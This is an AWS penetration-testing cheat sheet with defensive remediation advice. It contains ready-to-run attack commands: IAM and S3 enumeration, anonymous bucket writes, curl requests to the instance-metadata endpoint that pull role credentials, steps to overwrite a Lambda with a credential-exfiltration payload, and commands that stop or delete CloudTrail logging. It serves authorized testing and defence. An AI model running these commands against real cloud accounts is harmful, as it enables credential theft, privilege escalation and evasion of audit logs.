# AWS Pentest

> IAM enumeration, S3 misconfig, instance-metadata abuse, Lambda/role privilege paths. Authorized engagements only — AWS abuse-team scrutiny is real.

## TL;DR
- Start with credential inventory: `~/.aws/credentials`, env vars, `.git/config`-leaked keys (`gitleaks`, `trufflehog`), SSRF→IMDS.
- Enum with the credential's least-blast-radius identity first: `aws sts get-caller-identity`, then `enumerate-iam` / pacu.
- IMDSv1 vs IMDSv2: IMDSv1 returns creds to any HTTP GET; IMDSv2 requires a PUT-issued session token first (and TTL=1 blocks SSRF chains crossing a hop limit).
- S3 misconfig is still the cheapest finding: public-read ACLs, public bucket policies, listable buckets, world-writable buckets.
- Map: MITRE ATT&CK for Cloud (AWS matrix).

## Detection / Discovery

### Credential identity & permissions
| Command | Description |
| --- | --- |
| `aws sts get-caller-identity` | What identity does this access key belong to? |
| `aws iam list-attached-user-policies --user-name <u>` | Direct managed policies |
| `aws iam list-user-policies --user-name <u>` | Inline policies |
| `aws iam list-groups-for-user --user-name <u>` | Group memberships (pull each group's policies) |
| `enumerate-iam --access-key … --secret-key …` | Brute-force which API calls succeed (https://github.com/andresriancho/enumerate-iam) |

### Service surface
| Command | Description |
| --- | --- |
| `aws s3 ls` | List all buckets you can see |
| `aws s3api list-buckets --query 'Buckets[].Name'` | Just the names |
| `aws ec2 describe-instances --output table` | EC2 inventory |
| `aws lambda list-functions` | Lambda inventory |
| `aws rds describe-db-instances` | RDS inventory |
| `aws secretsmanager list-secrets` | Secrets Manager inventory |
| `aws ssm describe-parameters` | SSM Parameter Store inventory |

### Pacu (RhinoSecurityLabs)
| Command | Description |
| --- | --- |
| `pacu` then `import_keys default` | Boot with your local AWS profile |
| `run iam__enum_users_roles_policies_groups` | Broad IAM enumeration |
| `run iam__privesc_scan` | Try known privesc paths against current identity |
| `run s3__bucket_finder --keywords company,prod` | Bucket-name brute force |

## Exploitation

### S3 misconfiguration
| Command | Description |
| --- | --- |
| `curl https://<bucket>.s3.amazonaws.com/` | List with no auth → public-read ACL on bucket |
| `aws s3 ls s3://<bucket> --no-sign-request` | Anonymous list |
| `aws s3 cp file.txt s3://<bucket>/ --no-sign-request` | Anonymous write (world-writable bucket) |
| `aws s3api get-bucket-policy --bucket <bucket>` | Inspect bucket policy for `Principal: *` |
| `aws s3api get-bucket-acl --bucket <bucket>` | Inspect ACL for `AllUsers` / `AuthenticatedUsers` grants |

### IAM privilege escalation (canonical paths)
Rhino's `iam__privesc_scan` checks these:
- `iam:CreateAccessKey` on another user → mint keys as that user.
- `iam:CreatePolicyVersion` with `SetAsDefault=true` → swap the default policy version of an attached managed policy.
- `iam:PassRole` + `lambda:CreateFunction`+`lambda:InvokeFunction` → run code under a privileged role.
- `iam:PassRole` + `ec2:RunInstances` → spawn EC2 with InstanceProfile of a privileged role; SSRF the metadata.
- `sts:AssumeRole` on a wildcard-trust role → assume directly.
Reference: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigations/

### Lambda role exfil
```bash
# Find a Lambda you can update
aws lambda list-functions
aws lambda get-function --function-name <fn>
# Overwrite code with a creds-exfil payload, then invoke
zip pwn.zip lambda_function.py
aws lambda update-function-code --function-name <fn> --zip-file fileb://pwn.zip
aws lambda invoke --function-name <fn> /tmp/out.json
```

### Instance metadata abuse via SSRF
See [./ssrf-cloud-metadata.md](./ssrf-cloud-metadata.md). Short form:
```bash
# IMDSv1 (legacy)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (token-based)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
Then export the returned `AccessKeyId` / `SecretAccessKey` / `Token` and run `aws sts get-caller-identity` to confirm.

### Bonus: stop CloudTrail before noisy actions (red team)
```bash
aws cloudtrail stop-logging --name <trail>     # requires cloudtrail:StopLogging
aws cloudtrail delete-trail --name <trail>     # noisy on its own
```
This will be detected by GuardDuty (`Stealth:IAMUser/CloudTrailLoggingDisabled`) — only relevant in red-team scenarios with stated success criteria.

## Defence / Remediation
- **Enforce IMDSv2** account-wide via `aws ec2 modify-instance-metadata-defaults --http-tokens required --http-put-response-hop-limit 1`. Existing instances: `modify-instance-metadata-options --http-tokens required`. (Addresses the Capital One CVE-class.)
- **Block public S3** at the account level: `aws s3control put-public-access-block --account-id <id> --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true`.
- **Least-privilege IAM** with permissions boundaries on power roles; deny `iam:CreatePolicyVersion`, `iam:PassRole *`, `sts:AssumeRole *` for non-admin roles.
- **CloudTrail with log file validation** to all regions, S3 server-side encryption + object-lock; ship to a separate logging account.
- **GuardDuty + Security Hub** with auto-remediation Lambdas for: `IAMUser/ConsoleLogin` from unusual geographies, `Recon:IAMUser/MaliciousIPCaller`, `UnauthorizedAccess:S3/MaliciousIPCaller`.
- **Access Analyzer** to enumerate cross-account / public access surfaces.

## Sources
- AWS Security Documentation: https://docs.aws.amazon.com/security/
- AWS IMDSv2 reference: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html
- hackingthe.cloud — AWS: https://hackingthe.cloud/
- pacu: https://github.com/RhinoSecurityLabs/pacu
- enumerate-iam: https://github.com/andresriancho/enumerate-iam
- Rhino — 21 AWS Privesc Methods: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigations/
- MITRE ATT&CK for Cloud (IaaS): https://attack.mitre.org/matrices/enterprise/cloud/iaas/
- PayloadsAllTheThings AWS: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md
